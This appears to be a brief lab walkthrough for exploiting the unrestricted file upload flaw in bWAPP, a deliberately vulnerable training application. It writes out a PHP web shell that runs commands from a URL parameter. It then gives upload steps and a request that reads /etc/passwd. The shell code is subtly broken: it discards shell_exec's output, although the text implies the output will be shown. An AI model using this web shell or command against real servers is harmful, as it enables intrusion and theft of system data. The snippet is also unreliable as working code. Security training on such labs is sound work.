# Exploiting Unrestricted File Upload in bWAPP

## Steps to Exploit

### 1. Navigate to Unrestricted File Upload
* Log in to bWAPP.
* Go to **Unrestricted File Upload** from the list of vulnerabilities.

### 2. Prepare the Malicious PHP File
Create a file named `shell.php` with the following payload:

```php
<?php echo "<pre>"; shell_exec($_GET['cmd']); echo "</pre>"; ?>
```

### 3. Upload the Malicious File
* Click **Browse**, select `shell.php`, and then click **Upload**.
* Click on **here** after the upload is completed.
* If a blank page is displayed, it means the file executed but no output was given.

### 4. Execute Commands via Web UI
In the browser, visit the uploaded file (the blank page that was opened in a separate tab) and append a command using the `cmd` parameter.

Example payload to list system users:

```
http://localhost/bWAPP/images/shell.php?cmd=cat+/etc/passwd
```
